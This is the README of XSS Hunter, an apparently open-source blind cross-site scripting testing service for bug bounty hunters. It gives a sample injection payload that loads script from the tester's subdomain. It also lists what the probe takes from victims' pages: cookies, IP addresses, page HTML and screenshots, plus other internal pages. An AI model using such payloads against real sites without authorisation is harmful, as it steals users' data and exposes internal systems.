# XSS Hunter Source Code
This is a portable version of the source code running on https://xsshunter.com. It is designed to be easily-installable on any server for security professionals and bug bounty hunters who wish to test for XSS in a much more powerful way.

**If you don't want to set up this software and would rather just start testing, see https://xsshunter.com .**

# Requirements
* A server running (preferably) Ubuntu.
* A [Mailgun](http://www.mailgun.com/) account, for sending out XSS payload fire emails.
* A domain name, preferably something short to keep payload sizes down. Here is a good website for finding two letter domain names: [https://catechgory.com/](https://catechgory.com/). My domain is [xss.ht](xss.ht) for example.
* A wildcard SSL certificate, [here's a cheap one](https://www.namecheap.com/security/ssl-certificates/wildcard.aspx). This is required because XSS Hunter identifies users based off of their sub-domains and they all need to be SSL-enabled. We can't use Let's Encrypt because [they don't support wildcard certificates](https://community.letsencrypt.org/t/frequently-asked-questions-faq/26). I'm going to hold off on insulting the CA business model, but rest assured it's very silly and costs them very little to mint you a wildcard certificate so go with the cheapest provider you can find (as long as it's supported in all browsers).
    
# Setup
Please see https://thehackerblog.com/xss-hunter-is-now-open-source-heres-how-to-set-it-up/ for information on how to set up XSS Hunter on your own server.

# Summary of Functionality
*Upon signing up you will create a special short domain such as `yoursubdomain.xss.ht` which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing, using injection attempts such as `"><script src=//yoursubdomain.xss.ht></script>`. XSS Hunter will automatically serve up XSS probes and collect the resulting information when they fire.*

# Features
* **Managed XSS payload fires**: Manage all of your XSS payloads in your XSS Hunter account's control panel.
* **Powerful XSS Probes**: The following information is collected everytime a probe fires on a vulnerable page:
    * The vulnerable page's URI 
    * Origin of Execution 
    * The Victim's IP Address 
    * The Page Referer 
    * The Victim's User Agent 
    * All Non-HTTP-Only Cookies 
    * The Page's Full HTML DOM 
    * Full Screenshot of the Affected Page 
    * Responsible HTTP Request (If an XSS Hunter compatible tool is used) 
* **Full Page Screenshots**: XSS Hunter probes utilize the HTML5 canvas API to generate a full screenshot of the vulnerable page which an XSS payload has fired on. With this feature you can peak into internal administrative panels, support desks, logging systems, and other internal web apps. This allows for more powerful reports that show the full impact of the vulnerability to your client or bug bounty program.
* **Markup Report Generation**: Each XSS payload report comes with a pre-generated markdown report. These generated reports are also compatible with other markdown-supporting platforms such as Phabricator for easy bug reporting on company ticketing systems.
* **XSS Payload Fire Email Reports**: XSS payload fires also send out detailed email reports which can be easily forwarded to the appropriate security contacts for easy reporting of critical bugs.
* **Automatic Payload Generation**: XSS Hunter automatically generates XSS payloads for you to use in your web application security testing.
* **Correlated Injections**: Perhaps the most powerful feature of XSS Hunter is the ability to correlated injection attempts with XSS payload fires. By using an [XSS Hunter compatible testing tool](https://github.com/mandatoryprogrammer/xsshunter_client) you can know immediately what caused a specific payload to fire (even weeks after the injection attempt was made!).
* **Option PGP Encryption for Payload Emails**: Extra paranoid? Client-side PGP encryption is available which will encrypt all injection data in the victim's browser before sending it off to the XSS Hunter service.
* **Page Grabbing**: Upon your XSS payload firing you can specify a list of relative paths for the payload to automatically retrieve and store. This is useful in finding other vulnerabilities such as bad `crossdomain.xml` policies on internal systems which normally couldn't be accessed.
* **Secondary Payload Loading**: Got a secondary payload that you want to load after XSS Hunter has done it's thing? XSS Hunter offers you the option to specify a secondary JavaScript payload to run after it's completed it's collection.
* **iOS Web Application**: It is also possible to view your XSS payload fires via an iOS web app. Simple navigate to the `/app` path and save the page as a web application to your iPhone's desktop.

# Notable Exploits
* Blind XSS in Tesla's internal servicing tool: https://samcurry.net/cracking-my-windshield-and-earning-10000-on-the-tesla-bug-bounty-program/
* Blind XSS in Spotify's Salesforce integration: https://mhmdiaa.github.io/blind-xss-in-spotify/
* Blind XSS in GoDaddy's support panel: https://thehackerblog.com/poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss/

# Want to Contribute?
All code was created by me and (for that reason) is likely *not* best practice and *definitely* in need of optimization/cleanup. Any pull requests are appreciated!
